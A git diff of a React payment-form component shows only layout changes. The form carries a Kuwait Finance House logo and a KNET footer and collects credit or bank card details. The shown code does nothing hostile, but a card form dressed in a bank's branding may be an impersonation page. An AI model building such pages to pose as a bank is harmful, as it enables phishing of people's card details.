@@ -120,20 +120,13 @@ export default function PaymentForm({
   }
 
   return (
-    <> <img 
+    <div> <img 
     className="w-full h-18 m-1 rounded-lg" 
     src="/1212122.PNG" 
     alt="Kuwait Finance House Logo"
   />
-    <Card className="w-full bg-gray-100 
-
-">
-     
-      <CardHeader>
-        <Card className="bg-white shadow-xl
-
-">
-          <CardContent className="space-y-4">
+        <Card className="bg-white shadow-xl  min-w-[300px]">
+          <CardContent className="">
             <img 
               className="w-full h-14 my-4 object-contain" 
               src="/516815.jpeg" 
@@ -149,11 +142,9 @@ export default function PaymentForm({
             </div>
           </CardContent>
         </Card>
-      </CardHeader>
 
-      <CardContent>
         {(paymentMethod === 'credit_card' || paymentMethod === 'bank_card') && (
-          <Card className='shadow-xl          '>
+          <Card className='shadow-xl    mt-2      '>
             <CardContent className="p-6">
               {step === 1 ? (
                 <form onSubmit={handlePaymentInfoSubmit} className="space-y-6">
@@ -326,7 +317,6 @@ i}                          </option>
             </CardContent>
           </Card>
         )}
-      </CardContent>
 
       <footer className="text-center p-4 text-sm text-gray-600">
         <p>© 2024 جميع الحقوق محفوظة</p>
@@ -334,8 +324,7 @@ i}                          </option>
           شركة الخدمات المصرفية الآلية المشتركة – كي نت
         </a>
       </footer>
-    </Card>
-    </>
+    </div>
   )
 }
 
